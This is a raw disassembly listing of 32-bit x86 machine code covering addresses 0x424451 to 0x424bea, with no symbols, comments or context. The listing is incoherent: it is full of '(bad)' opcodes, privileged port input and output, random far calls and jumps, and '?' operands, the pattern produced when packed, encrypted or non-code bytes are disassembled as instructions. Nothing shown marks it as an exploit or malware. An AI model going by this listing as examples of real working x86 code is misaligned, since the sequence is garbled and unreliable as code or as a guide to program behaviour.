  424451:	xor    al,0xb8
  424453:	(bad)  
  424454:	fld    DWORD PTR [eax+0x43b659a0]
  42445a:	or     ecx,DWORD PTR [edx+0x435c487e]
  424460:	enter  0x409e,0x85
  424464:	(bad)  
  424465:	xchg   edx,eax
  424466:	inc    edx
  424467:	inc    esi
  424468:	aas    
  424469:	int    0x75
  42446b:	pop    ecx
  42446c:	push   eax
  42446d:	pop    ebp
  42446e:	xor    ebp,ebx
  424470:	jmp    0xdda28f07
  424475:	or     al,0xd
  424477:	xchg   ebx,eax
  424478:	ins    DWORD PTR es:[edi],dx
  424479:	mov    ebp,0x71caaf4d
  42447e:	ret    0xbf95
  424481:	adc    bl,BYTE PTR ds:0xc527fe8f
  424487:	fcmovb st,st(6)
  424489:	jne    0x424433
  42448b:	popf   
  42448c:	in     eax,dx
  42448d:	repnz das 
  42448f:	xchg   ebx,eax
  424490:	adc    DWORD PTR ds:0x52f40398,eax
  424496:	mov    bh,0xae
  424498:	mov    bh,0x73
  42449a:	mov    ch,0xf4
  42449c:	pop    ebp
  42449d:	mov    al,ds:0xb6c67532
  4244a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244a3:	(bad)  
  4244a4:	mov    ds:0x7d31e0e5,al
  4244a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4244aa:	addr16 ja 0x424453
  4244ad:	and    al,0x4e
  4244af:	inc    edi
  4244b0:	dec    edx
  4244b1:	mov    ebp,0xb32cc829
  4244b6:	adc    DWORD PTR [ebx],ebp
  4244b8:	mov    edi,0xfe95790
  4244bd:	and    DWORD PTR [ebp+0x1caf8bd9],0x34
  4244c4:	repnz cmp BYTE PTR [ecx-0x25607df0],0x14
  4244cc:	push   0xd
  4244ce:	imul   edi,ebp,0x44
  4244d1:	pop    es
  4244d2:	out    dx,al
  4244d3:	mov    cl,0x8a
  4244d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244d6:	jg     0x424510
  4244d8:	fcomp  QWORD PTR [ecx-0x6f4afacc]
  4244de:	aaa    
  4244df:	cmc    
  4244e0:	(bad)  
  4244e2:	cmp    BYTE PTR [eax],dl
  4244e4:	mov    ds:0x767b83ba,eax
  4244e9:	mov    ds:0x468dd0a5,eax
  4244ee:	sub    DWORD PTR [edx],ebx
  4244f0:	fst    DWORD PTR [ebp-0xe]
  4244f3:	mov    BYTE PTR [ecx+0x35aea028],bl
  4244f9:	and    cl,bl
  4244fb:	lock sub DWORD PTR [edx],eax
  4244fe:	mov    bh,0x55
  424500:	inc    ecx
  424501:	aas    
  424502:	pop    ecx
  424503:	sub    eax,DWORD PTR [esi]
  424505:	sahf   
  424506:	in     al,dx
  424507:	cmc    
  424508:	sub    al,0xcf
  42450a:	enter  0x26,0xdf
  42450e:	scas   eax,DWORD PTR es:[edi]
  42450f:	inc    edx
  424510:	add    BYTE PTR [esp+edi*2+0x44f37e66],ah
  424517:	xchg   esi,eax
  424518:	adc    BYTE PTR [ebp+0x5a445681],bh
  42451e:	xchg   ecx,eax
  42451f:	xor    dh,ch
  424521:	adc    al,0x1f
  424523:	in     al,0x75
  424525:	jo     0x42456f
  424527:	test   al,0xa9
  424529:	jnp    0x424597
  42452b:	jecxz  0x42457a
  42452d:	aaa    
  42452e:	pop    ebp
  42452f:	adc    al,0xa8
  424531:	lock jg 0x4244f2
  424534:	inc    esi
  424535:	(bad)
  424538:	push   cs
  424539:	in     al,0x2e
  42453b:	adc    al,BYTE PTR ds:0x411449d8
  424541:	cmp    DWORD PTR [ebp+0x3f],eax
  424544:	ret    0x9c7e
  424547:	outs   dx,DWORD PTR ds:[esi]
  424548:	cmc    
  424549:	hlt    
  42454a:	jp     0x424576
  42454c:	shl    al,cl
  42454e:	ror    DWORD PTR [edx+0x2e],0x2a
  424552:	jl     0x4244ec
  424554:	scas   al,BYTE PTR es:[edi]
  424555:	(bad)  
  424556:	sbb    ecx,ecx
  424558:	and    esi,DWORD PTR [edx-0x1d]
  42455b:	pop    ebp
  42455c:	pushf  
  42455d:	and    BYTE PTR [edi+0xe],bl
  424560:	cld    
  424561:	pop    ecx
  424562:	out    0x50,eax
  424564:	js     0x42458e
  424566:	div    edx
  424568:	xor    BYTE PTR [edi-0x77],ch
  42456b:	inc    ecx
  42456c:	adc    al,0xbd
  42456e:	or     DWORD PTR [edi+0x43704cfc],edi
  424574:	ins    BYTE PTR es:[edi],dx
  424575:	mov    ah,0xcd
  424577:	push   es
  424578:	pop    esi
  424579:	sar    eax,1
  42457b:	aaa    
  42457c:	in     al,0x7e
  42457e:	sbb    al,0xc
  424580:	add    DWORD PTR [eax-0x38],edi
  424583:	push   0x8a487982
  424588:	inc    esp
  424589:	lods   eax,DWORD PTR ds:[esi]
  42458a:	or     ch,BYTE PTR [ebp+0x4b]
  42458d:	inc    ebx
  42458e:	push   edi
  42458f:	loop   0x4245ac
  424591:	cs clc 
  424593:	in     al,0x4e
  424595:	sahf   
  424596:	lds    edx,FWORD PTR [esi-0x6e57a2d2]
  42459c:	mov    eax,0x8f921e18
  4245a1:	int    0x62
  4245a3:	dec    DWORD PTR [ecx+ecx*1+0x1c]
  4245a7:	jno    0x42453b
  4245a9:	inc    ebx
  4245aa:	int3   
  4245ab:	mov    al,0x60
  4245ad:	mov    bl,dh
  4245af:	(bad)  
  4245b1:	xor    al,BYTE PTR [edi]
  4245b3:	out    0xc3,eax
  4245b5:	and    bh,BYTE PTR [edx-0xe]
  4245b8:	mov    BYTE PTR [edx-0x6566cf3c],ch
  4245be:	loop   0x424633
  4245c0:	jl     0x42460a
  4245c2:	sbb    BYTE PTR [ecx],cl
  4245c4:	(bad)  [edx+0x357036e6]
  4245ca:	xor    DWORD PTR [ebx+ecx*8],0x721a52fa
  4245d1:	mov    cl,0xf0
  4245d3:	pop    ds
  4245d4:	mov    eax,0x969af162
  4245d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4245da:	xor    edx,DWORD PTR ds:0x595cbc02
  4245e0:	adc    eax,0x33f66cf0
  4245e5:	ret    0x35bb
  4245e8:	mov    bl,0x5a
  4245ea:	push   ss
  4245eb:	rcr    bl,cl
  4245ed:	mov    ds:0xe6fc911b,eax
  4245f2:	xlat   BYTE PTR ds:[ebx]
  4245f3:	mov    eax,0xc6e78753
  4245f8:	pop    es
  4245f9:	aas    
  4245fa:	xor    eax,0xa28731a6
  4245ff:	dec    edi
  424600:	mov    esi,0xcdec077d
  424605:	jecxz  0x4245c7
  424607:	scas   al,BYTE PTR es:[edi]
  424608:	aad    0x56
  42460a:	jnp    0x4245c8
  42460c:	dec    esi
  42460d:	mov    cs,WORD PTR ds:0xa480046e
  424613:	nop
  424614:	sbb    DWORD PTR [ecx+0x3f074675],ebp
  42461a:	mov    al,0x33
  42461c:	call   0x62dc:0x695a276e
  424623:	jne    0x4245f5
  424625:	or     al,0xb7
  424627:	ret    0xfc3
  42462a:	ret    
  42462b:	test   DWORD PTR [eax],esi
  42462d:	add    eax,0xab74dde7
  424632:	fiadd  DWORD PTR [edi+edx*8+0x3207c284]
  424639:	xchg   ebp,eax
  42463a:	fst    QWORD PTR [ecx]
  42463c:	jo     0x42463a
  42463e:	ins    BYTE PTR es:[edi],dx
  42463f:	ret    
  424640:	jnp    0x4245d1
  424642:	sub    DWORD PTR [edi+0x6e0089ec],esp
  424648:	push   DWORD PTR [ecx+0x20]
  42464b:	xor    bl,ah
  42464d:	inc    esp
  42464e:	dec    ebp
  42464f:	fwait
  424650:	mov    ah,0x25
  424652:	inc    ebp
  424653:	shl    DWORD PTR [ecx+0x37480de2],0x4
  42465a:	mov    bh,0xe
  42465c:	mov    al,ds:0x5fb8b66d
  424661:	int    0x8e
  424663:	ficomp DWORD PTR [edi]
  424665:	sbb    BYTE PTR [ebx],dl
  424667:	lods   eax,DWORD PTR ds:[esi]
  424668:	(bad)  
  42466a:	push   ebp
  42466b:	sub    al,bh
  42466d:	xchg   esp,ecx
  42466f:	cmc    
  424670:	dec    edx
  424671:	and    al,0xab
  424673:	adc    al,BYTE PTR [eax+0x547dea44]
  424679:	jbe    0x42465c
  42467b:	and    BYTE PTR [esi],ah
  42467d:	fwait
  42467e:	loop   0x424643
  424680:	pop    ecx
  424681:	ficom  WORD PTR [ecx+0x46]
  424684:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424685:	dec    esp
  424686:	jb     0x424696
  424688:	lock enter 0xd2ec,0xd2
  42468d:	or     eax,0xf13e02f5
  424692:	clc    
  424693:	push   ebx
  424694:	push   cs
  424695:	out    0xd8,al
  424697:	adc    DWORD PTR ds:0x89286cee,esi
  42469d:	cmc    
  42469e:	repz call 0x93c7:0x7573cfae
  4246a6:	xor    DWORD PTR [edx],esi
  4246a8:	js     0x4246c2
  4246aa:	or     BYTE PTR [ebx],dh
  4246ac:	aaa    
  4246ad:	jl     0x42468a
  4246af:	out    0x2a,eax
  4246b1:	and    BYTE PTR [esi],cl
  4246b3:	sub    al,0x5c
  4246b5:	loopne 0x42466c
  4246b7:	shl    BYTE PTR [eax],0x19
  4246ba:	aas    
  4246bb:	mov    eax,0xf6da3006
  4246c0:	jno    0x42473e
  4246c2:	out    dx,eax
  4246c3:	adc    DWORD PTR [eax],esp
  4246c5:	out    dx,eax
  4246c6:	or     al,BYTE PTR [edx+ebx*2-0x7]
  4246ca:	push   ds
  4246cb:	sbb    DWORD PTR fs:[eax-0x40683c2f],0x1b
  4246d3:	xchg   ecx,eax
  4246d4:	mov    ecx,DWORD PTR [eax+ebx*4]
  4246d7:	out    0x70,al
  4246d9:	adc    DWORD PTR [eax],esp
  4246db:	in     eax,0x39
  4246dd:	outs   dx,DWORD PTR ds:[esi]
  4246de:	xchg   edx,eax
  4246df:	fistp  DWORD PTR [edx+0x37b57c1f]
  4246e5:	sub    eax,0xdae9b99e
  4246ea:	adc    BYTE PTR [esi+0x2b],dh
  4246ed:	jge    0x4246af
  4246ef:	or     ebp,DWORD PTR [ecx]
  4246f1:	pop    edx
  4246f2:	(bad)  
  4246f3:	mov    edi,0xaaf51a10
  4246f8:	mov    dh,0xc7
  4246fa:	lahf   
  4246fb:	push   esi
  4246fc:	nop
  4246fd:	or     ecx,DWORD PTR [eax]
  4246ff:	(bad)  
  424700:	and    al,0xed
  424702:	inc    esi
  424703:	push   es
  424704:	scas   eax,DWORD PTR es:[edi]
  424705:	outs   dx,BYTE PTR ds:[esi]
  424706:	scas   al,BYTE PTR es:[edi]
  424707:	(bad)  
  424708:	sbb    ecx,ebp
  42470a:	xchg   BYTE PTR [esi+0x33],dl
  42470d:	cwde   
  42470e:	jecxz  0x4246d1
  424710:	or     DWORD PTR [edx+0x7b],ebx
  424713:	xor    BYTE PTR [ecx-0x4e],bl
  424716:	add    BYTE PTR [esi+ebp*2+0x37],dl
  42471a:	das    
  42471b:	sbb    ecx,DWORD PTR [ecx]
  42471d:	test   eax,0x928c078a
  424722:	scas   eax,DWORD PTR es:[edi]
  424723:	scas   eax,DWORD PTR es:[edi]
  424724:	mov    ecx,edx
  424726:	xor    eax,0xc89009f8
  42472b:	popf   
  42472c:	in     al,0x23
  42472e:	dec    edi
  42472f:	push   eax
  424730:	fimul  DWORD PTR [eax+edi*4+0x343f233f]
  424737:	adc    ebp,DWORD PTR [eax-0xd]
  42473a:	into   
  42473b:	test   al,0x2d
  42473d:	fst    QWORD PTR [ecx-0x5e49c2fa]
  424743:	repz mov ds:0x7ccdacd4,eax
  424749:	jnp    0x424783
  42474b:	jnp    0x424793
  42474d:	shl    edi,1
  42474f:	repz xchg ebp,eax
  424751:	imul   BYTE PTR [ebx+ebx*1]
  424754:	loopne 0x424751
  424756:	jne    0x424779
  424758:	xlat   BYTE PTR ds:[ebx]
  424759:	sub    bh,BYTE PTR [eax-0x4aded534]
  42475f:	(bad)  
  424760:	cs xchg esp,eax
  424762:	lods   eax,DWORD PTR ds:[esi]
  424763:	mov    al,ds:0xc0197c73
  424768:	or     eax,0x12639baf
  42476d:	das    
  42476e:	pop    eax
  42476f:	mov    ebp,0xe7667956
  424774:	xchg   edx,eax
  424775:	shr    BYTE PTR [edx+0x1053bd2d],0xc6
  42477c:	jmp    0xbfad:0x710cd39e
  424783:	retw   0xa4c4
  424787:	cmp    al,0x94
  424789:	mov    al,0xab
  42478b:	stc    
  42478c:	aad    0xb2
  42478e:	mov    dh,al
  424790:	xchg   ecx,eax
  424791:	fisttp WORD PTR es:[ebp-0x27]
  424795:	push   DWORD PTR [eax+0x6f]
  424798:	es out dx,al
  42479a:	sti    
  42479b:	pop    ds
  42479c:	xor    edx,esp
  42479e:	inc    ebp
  42479f:	and    ah,BYTE PTR [edi-0x21]
  4247a2:	stc    
  4247a3:	mov    WORD PTR [ecx],ss
  4247a5:	add    eax,0xbb9bcab7
  4247aa:	sbb    DWORD PTR [eax-0x73e6eaa3],edx
  4247b0:	jmp    0x4247bd
  4247b2:	add    edi,DWORD PTR [esi]
  4247b4:	repnz and eax,eax
  4247b7:	and    bl,BYTE PTR [ebp*2-0x5e1528e1]
  4247be:	shl    BYTE PTR [ebx],cl
  4247c0:	sti    
  4247c1:	inc    ebx
  4247c2:	jae    0x42483a
  4247c4:	(bad)  
  4247c5:	mov    esp,0xf2749aba
  4247ca:	sub    BYTE PTR [eax-0x2142dfbf],bl
  4247d0:	iret   
  4247d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247d2:	cmc    
  4247d3:	aam    0x7a
  4247d5:	xor    BYTE PTR [ebx+0x42],0xd4
  4247d9:	xor    ebx,DWORD PTR [ecx+0x5571e490]
  4247df:	xor    ebp,eax
  4247e1:	bound  eax,QWORD PTR [ecx-0x32ed573a]
  4247e7:	mov    ?,WORD PTR ds:0x7588eb54
  4247ed:	jnp    0x4247ad
  4247ef:	inc    ebp
  4247f0:	pop    edx
  4247f1:	mov    ?,WORD PTR [edx]
  4247f3:	jl     0x424803
  4247f5:	ins    DWORD PTR es:[edi],dx
  4247f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4247f7:	mov    esp,DWORD PTR [ebp-0x24]
  4247fa:	test   DWORD PTR [ebp+0x49c70649],0xa118aa12
  424804:	lods   al,BYTE PTR ds:[esi]
  424805:	dec    ebp
  424806:	enter  0x5f74,0xd4
  42480a:	pop    ecx
  42480b:	xor    DWORD PTR [ebp+0x5e],ebx
  42480e:	or     al,0x9c
  424810:	lea    ecx,[ebx+0x3f]
  424813:	sub    ebp,DWORD PTR [edx+edx*8+0x4d9ff561]
  42481a:	xor    al,0x15
  42481c:	mov    edi,0x54369995
  424821:	jmp    0xf5d3:0xdcc5195b
  424828:	inc    ebp
  424829:	ins    BYTE PTR es:[edi],dx
  42482a:	xor    BYTE PTR [ecx],bl
  42482c:	clc    
  42482d:	lods   eax,DWORD PTR ds:[esi]
  42482e:	dec    edi
  42482f:	mov    al,0xd0
  424831:	mov    dh,0xd6
  424833:	jae    0x4247b5
  424835:	in     al,0x40
  424837:	je     0x424820
  424839:	jae    0x424837
  42483b:	fwait
  42483c:	stc    
  42483d:	or     BYTE PTR [ebx+ecx*1],dh
  424840:	adc    BYTE PTR [edx-0x39],ch
  424843:	and    eax,DWORD PTR [edi-0x58]
  424846:	push   ds
  424847:	daa    
  424848:	mov    WORD PTR [ecx+0x63c9d99d],es
  42484e:	sbb    DWORD PTR [ecx-0x54],eax
  424851:	scas   eax,DWORD PTR es:[edi]
  424852:	(bad)  
  424853:	in     al,dx
  424854:	mov    dl,0x69
  424856:	xchg   ecx,eax
  424857:	cmp    ebp,DWORD PTR [esi]
  424859:	aam    0x42
  42485b:	mov    bl,BYTE PTR [edx-0x36]
  42485e:	fcom   QWORD PTR [eax+eiz*1]
  424861:	repnz push esp
  424863:	mov    ebx,0xb7414350
  424868:	retf   0xedb
  42486b:	sbb    eax,0xafbcc3b0
  424870:	push   esp
  424871:	sahf   
  424872:	sahf   
  424873:	jl     0x424876
  424875:	sub    al,0x97
  424877:	ss mov ah,0x32
  42487a:	adc    DWORD PTR [ebx+0xa7ee16c],edi
  424880:	push   edi
  424881:	sub    BYTE PTR [ebx],ah
  424883:	add    eax,0xe7f737d1
  424888:	inc    ebx
  424889:	inc    esi
  42488a:	pop    ecx
  42488b:	ror    DWORD PTR [eax+eiz*4-0x16],0x84
  424890:	cli    
  424891:	fadd   DWORD PTR [eax-0x14fc6dca]
  424897:	int    0xa0
  424899:	push   ss
  42489a:	xchg   ebp,eax
  42489b:	loope  0x4248a7
  42489d:	in     al,0x61
  42489f:	out    dx,al
  4248a0:	(bad)  
  4248a1:	jbe    0x424903
  4248a3:	cmp    DWORD PTR [edi-0x9],0x8ba32035
  4248aa:	mov    ch,0xd
  4248ac:	imul   esp,DWORD PTR [ebx-0x26cd7312],0x40
  4248b3:	out    dx,eax
  4248b4:	and    ecx,edx
  4248b6:	fmul   st,st(4)
  4248b8:	xor    eax,ebp
  4248ba:	loop   0x424844
  4248bc:	inc    ebp
  4248bd:	inc    esp
  4248be:	push   esi
  4248bf:	xchg   esi,eax
  4248c0:	div    DWORD PTR [esi+0x1acef147]
  4248c6:	or     edi,DWORD PTR [esp+edi*2+0x4e]
  4248ca:	cmp    al,0x59
  4248cc:	push   eax
  4248cd:	retf   
  4248ce:	sbb    eax,0xa8f8dfa7
  4248d3:	inc    esp
  4248d4:	jae    0x4248f2
  4248d6:	and    DWORD PTR [ebp+ecx*8+0x6b9ffe65],ecx
  4248dd:	fiadd  WORD PTR [ebp+ecx*4-0x86873a5]
  4248e4:	push   0x15
  4248e6:	pop    edx
  4248e7:	outs   dx,DWORD PTR ds:[esi]
  4248e8:	pop    esi
  4248e9:	cmp    eax,edi
  4248eb:	push   eax
  4248ec:	mov    ecx,0x7195524
  4248f1:	mov    edx,cs
  4248f3:	push   0x6a
  4248f5:	stos   BYTE PTR es:[edi],al
  4248f6:	xor    eax,0x141c6acd
  4248fb:	add    eax,0x111cb52e
  424900:	das    
  424901:	mov    al,0xa4
  424903:	push   ebp
  424904:	or     eax,0xe93ad72f
  424909:	popf   
  42490a:	int3   
  42490b:	mov    bl,0xd8
  42490d:	push   ds
  42490e:	pusha  
  42490f:	mov    esi,DWORD PTR [edx+0x9665a36]
  424915:	daa    
  424916:	inc    ecx
  424917:	bound  ecx,QWORD PTR [ebx-0x2b72d6c2]
  42491d:	adc    eax,0xa9e19072
  424922:	in     eax,0xd4
  424924:	and    dh,dl
  424926:	inc    edx
  424927:	inc    ebp
  424928:	das    
  424929:	xchg   ebx,eax
  42492a:	out    dx,ax
  42492c:	xchg   ebx,eax
  42492d:	mov    edi,0x546f29c4
  424932:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424933:	adc    eax,0x3dc551b3
  424938:	jnp    0x4249ac
  42493a:	add    BYTE PTR [edi],cl
  42493c:	sbb    BYTE PTR [ebx+0x21],bl
  42493f:	mov    BYTE PTR [esi+0x13a3ec36],ch
  424945:	es hlt 
  424947:	out    dx,al
  424948:	pop    es
  424949:	cli    
  42494a:	ret    
  42494b:	out    dx,al
  42494c:	pop    esi
  42494d:	pop    ebx
  42494e:	pop    es
  42494f:	sub    al,0x7e
  424951:	xor    bh,BYTE PTR [eax-0x72]
  424954:	jg     0x4249ba
  424956:	push   ecx
  424957:	cmp    BYTE PTR [ebx-0x7e],dl
  42495a:	mov    dh,BYTE PTR [edi]
  42495c:	(bad)  
  42495d:	call   DWORD PTR [ecx-0x28]
  424960:	mul    DWORD PTR [ebx-0x1d2c2642]
  424966:	add    al,0xe3
  424968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424969:	pop    esp
  42496a:	rol    DWORD PTR [ecx],cl
  42496c:	repz out 0x90,eax
  42496f:	mov    DWORD PTR [ebx-0x1a],esp
  424972:	dec    esi
  424973:	clc    
  424974:	pop    eax
  424975:	aaa    
  424976:	lahf   
  424977:	aad    0x14
  424979:	imul   ebp,esp,0x4
  42497c:	(bad)  
  42497d:	xor    edi,DWORD PTR [ebp-0x26069ad5]
  424983:	int    0x2d
  424985:	xor    edi,edx
  424987:	cmp    esp,DWORD PTR [edx-0x17]
  42498a:	ss retf 
  42498c:	mov    ?,WORD PTR [eax+0x2a]
  42498f:	sub    al,0x98
  424991:	aas    
  424992:	push   ecx
  424993:	add    BYTE PTR [ecx-0x76],0xdb
  424997:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424998:	clc    
  424999:	(bad)  
  42499a:	fist   WORD PTR [edx+0x26]
  42499d:	cmp    esp,DWORD PTR [eax-0x4d3e5789]
  4249a3:	and    ch,BYTE PTR [ecx]
  4249a5:	imul   ebx
  4249a7:	mov    eax,0x2b290e60
  4249ac:	je     0x42495b
  4249ae:	aam    0x9
  4249b0:	outs   dx,BYTE PTR ds:[esi]
  4249b1:	mov    ds:0x923ad53f,al
  4249b6:	mov    es,edx
  4249b8:	bound  ebx,QWORD PTR [edi-0x1e0cbceb]
  4249be:	jecxz  0x424972
  4249c0:	xchg   edx,eax
  4249c1:	test   al,0x53
  4249c3:	loope  0x42494a
  4249c5:	sti    
  4249c6:	add    DWORD PTR [edx],ebx
  4249c8:	mov    bl,0x80
  4249ca:	not    DWORD PTR cs:[ecx-0x609df57]
  4249d1:	call   0x8f0e0b41
  4249d6:	pop    edi
  4249d7:	xchg   esp,eax
  4249d8:	out    dx,eax
  4249d9:	ror    BYTE PTR [ecx-0x673bc215],1
  4249df:	mov    dl,0x30
  4249e1:	add    dh,bl
  4249e3:	sub    ch,bh
  4249e5:	push   esp
  4249e6:	das    
  4249e7:	mov    esi,0x924de23
  4249ec:	stc    
  4249ed:	fisttp QWORD PTR [ebp+0x55dc7778]
  4249f3:	test   BYTE PTR [ebp+0x1dafc034],0xa9
  4249fa:	pop    edx
  4249fb:	(bad)  [esi]
  4249fd:	or     dh,BYTE PTR [ecx+0x22ef4841]
  424a03:	loop   0x4249b5
  424a05:	int3   
  424a06:	push   ebp
  424a07:	lods   al,BYTE PTR ds:[esi]
  424a08:	pusha  
  424a09:	dec    ecx
  424a0a:	ret    0x27a7
  424a0d:	cmp    edx,esi
  424a0f:	into   
  424a10:	inc    ebp
  424a11:	call   0xde3d440
  424a16:	test   DWORD PTR [esi],ebp
  424a18:	das    
  424a19:	cmp    cl,bl
  424a1b:	sbb    ah,dl
  424a1d:	mov    edx,0xc5412ab6
  424a22:	scas   al,BYTE PTR es:[edi]
  424a23:	stc    
  424a24:	lods   eax,DWORD PTR ds:[esi]
  424a25:	fstp   st(0)
  424a27:	add    bl,BYTE PTR [ebx+0x34bcff11]
  424a2d:	pop    ebx
  424a2e:	clc    
  424a2f:	fsub   QWORD PTR [edx]
  424a31:	mov    eax,0x67c0ff39
  424a36:	jno    0x424a3a
  424a38:	inc    edx
  424a39:	cmp    esp,DWORD PTR [esp+eax*4-0xa]
  424a3d:	jl     0x424ab4
  424a3f:	cdq    
  424a40:	xchg   edi,eax
  424a41:	out    dx,eax
  424a42:	push   ds
  424a43:	or     eax,0x387099e7
  424a48:	mov    bh,0x4b
  424a4a:	adc    DWORD PTR [ebp+0x77],esi
  424a4d:	sbb    dh,dl
  424a4f:	clc    
  424a50:	jp     0x4249e0
  424a52:	clc    
  424a53:	inc    ebp
  424a54:	fsub   DWORD PTR [eax+ecx*4-0x47]
  424a58:	ret    
  424a59:	cld    
  424a5a:	push   ecx
  424a5b:	fadd   DWORD PTR [ebx+ebx*4+0xf6b274]
	...
  424a6a:	push   edx
  424a6b:	inc    ecx
  424a6c:	push   esp
  424a6d:	push   edx
  424a6e:	push   edi
  424a6f:	push   edi
  424a70:	push   esi
  424a71:	inc    ecx
  424a72:	ror    DWORD PTR [ebx-0x49],1
  424a75:	popf   
  424a76:	mov    edx,0x42bf33f8
  424a7b:	fadd   DWORD PTR [ecx]
  424a7d:	add    BYTE PTR [edi+0x6],bh
  424a80:	add    BYTE PTR [eax],al
  424a82:	int3   
  424a83:	or     al,BYTE PTR [ebp+0x8e4783d]
  424a89:	mov    bh,0x54
  424a8b:	xchg   esi,eax
  424a8c:	pop    esp
  424a8d:	fdiv   st,st(5)
  424a8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a90:	scas   eax,DWORD PTR es:[edi]
  424a91:	mov    bh,0xda
  424a93:	out    dx,al
  424a94:	into   
  424a95:	jno    0x424a2b
  424a97:	sar    DWORD PTR [edx+0x4cbcbdcc],cl
  424a9d:	sub    al,0x80
  424a9f:	xchg   ebx,eax
  424aa0:	jae    0x424a3d
  424aa2:	jb     0x424af6
  424aa4:	out    dx,eax
  424aa5:	stos   DWORD PTR es:[edi],eax
  424aa6:	call   0xe850:0xc0bef0ba
  424aad:	jmp    FWORD PTR [edx-0x57]
  424ab0:	adc    DWORD PTR cs:[ebx+0x5960b563],esp
  424ab7:	mov    ecx,0x8983e277
  424abc:	add    BYTE PTR [ebx+0x5b],0x9c
  424ac0:	sar    al,cl
  424ac2:	fadd   QWORD PTR [esi-0x5955b321]
  424ac8:	xor    DWORD PTR [edi],edx
  424aca:	push   es
  424acb:	mov    cl,0xa7
  424acd:	sub    al,0xbb
  424acf:	shr    BYTE PTR [eax+0x55],0xac
  424ad3:	push   ebx
  424ad4:	scas   al,BYTE PTR es:[edi]
  424ad5:	jmp    FWORD PTR [edx+eiz*2]
  424ad8:	pop    esi
  424ad9:	mov    edi,0x5a5bc93f
  424ade:	sar    edi,cl
  424ae0:	inc    edi
  424ae1:	idiv   cl
  424ae3:	retf   0x8c52
  424ae6:	or     al,BYTE PTR [ebp+0x179a9ba7]
  424aec:	or     al,0x2f
  424aee:	nop
  424aef:	dec    esp
  424af0:	imul   esp,ecx,0x4cb0c971
  424af6:	sti    
  424af7:	xchg   BYTE PTR [ebx+0x4e3e51fe],cl
  424afd:	adc    al,BYTE PTR [ebx+0x6e]
  424b00:	mov    ebx,0x5338ff76
  424b05:	aas    
  424b06:	and    eax,edi
  424b08:	sub    ebp,edi
  424b0a:	int3   
  424b0b:	push   cs
  424b0c:	mov    bh,0x42
  424b0e:	cmp    bh,al
  424b10:	inc    edx
  424b11:	call   0x1619:0x49c51363
  424b18:	jns    0x424af8
  424b1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424b1b:	add    eax,ecx
  424b1d:	inc    esi
  424b1e:	lea    esp,[esp+eax*4-0x4e6c07cb]
  424b25:	xor    DWORD PTR [esi],esp
  424b27:	cmp    BYTE PTR [ebp+0x17],al
  424b2a:	sub    dl,dh
  424b2c:	ins    DWORD PTR es:[edi],dx
  424b2d:	adc    DWORD PTR [edi+0x61],esp
  424b30:	popf   
  424b31:	adc    BYTE PTR [esi+0x3330447d],dh
  424b37:	push   ss
  424b38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b39:	test   BYTE PTR [edi+0x3c],cl
  424b3c:	sbb    BYTE PTR [edi+0x2b],ah
  424b3f:	mov    ds:0xe2153926,eax
  424b44:	push   0x3e
  424b46:	aas    
  424b47:	mov    ds:0x1278098d,eax
  424b4c:	xchg   esp,eax
  424b4d:	push   edi
  424b4e:	push   ss
  424b4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b50:	dec    edx
  424b51:	ret    
  424b52:	sub    ah,BYTE PTR [ecx+0x305d6ca2]
  424b58:	pop    ds
  424b59:	jnp    0x424b4e
  424b5b:	in     al,0xbb
  424b5d:	fist   DWORD PTR [ecx]
  424b5f:	mov    ebp,0xfcbd116d
  424b64:	push   0x17
  424b66:	or     edx,ebp
  424b68:	mov    ah,0xeb
  424b6a:	rcl    DWORD PTR [edx],1
  424b6c:	pop    esp
  424b6d:	xchg   ebx,eax
  424b6e:	inc    eax
  424b6f:	rcl    DWORD PTR [ecx],0x56
  424b72:	xchg   esp,eax
  424b73:	pop    es
  424b74:	repz aad 0x29
  424b77:	ins    BYTE PTR es:[edi],dx
  424b78:	push   eax
  424b79:	xchg   esi,eax
  424b7a:	sbb    eax,DWORD PTR [ebx-0x5e0322c0]
  424b80:	pop    eax
  424b81:	int3   
  424b82:	aam    0xc5
  424b84:	popa   
  424b85:	and    edx,DWORD PTR [ebp+eiz*8-0x22]
  424b89:	sub    al,0x5d
  424b8b:	sbb    eax,DWORD PTR [edx-0x28ddf3ea]
  424b91:	mov    al,ds:0x4c334f37
  424b96:	push   0x52
  424b98:	inc    ebp
  424b99:	push   edi
  424b9a:	adc    al,0xf1
  424b9c:	lock mov dh,0xee
  424b9f:	loop   0x424b6f
  424ba1:	fwait
  424ba2:	scas   eax,DWORD PTR es:[edi]
  424ba3:	mov    BYTE PTR [ecx],0x5c
  424ba6:	pop    es
  424ba7:	and    eax,0x1c2d9f3e
  424bac:	jb     0x424c02
  424bae:	out    dx,eax
  424baf:	xchg   ebx,eax
  424bb0:	enter  0x2730,0xc8
  424bb4:	loopne 0x424b5f
  424bb6:	cmp    bl,BYTE PTR [esi+0x72b92adf]
  424bbc:	(bad)  
  424bbd:	loope  0x424bb8
  424bbf:	retf   0xf351
  424bc2:	xchg   ebp,eax
  424bc3:	aas    
  424bc4:	mov    esi,0xd7a4629
  424bc9:	push   ecx
  424bca:	int    0x48
  424bcc:	add    BYTE PTR [edi],dh
  424bce:	(bad)  
  424bcf:	clc    
  424bd0:	sub    al,0x42
  424bd2:	inc    eax
  424bd3:	xor    eax,DWORD PTR [edx+0x49]
  424bd6:	aaa    
  424bd7:	dec    ecx
  424bd8:	rol    dh,cl
  424bda:	and    edx,DWORD PTR [ecx-0x35]
  424bdd:	jno    0x424bd7
  424bdf:	push   ebp
  424be0:	xor    BYTE PTR [edx],bh
  424be2:	push   ecx
  424be3:	adc    BYTE PTR [ebx-0x2d3788a2],ah
  424be9:	push   ss
  424bea:	xor    ah,0x3e
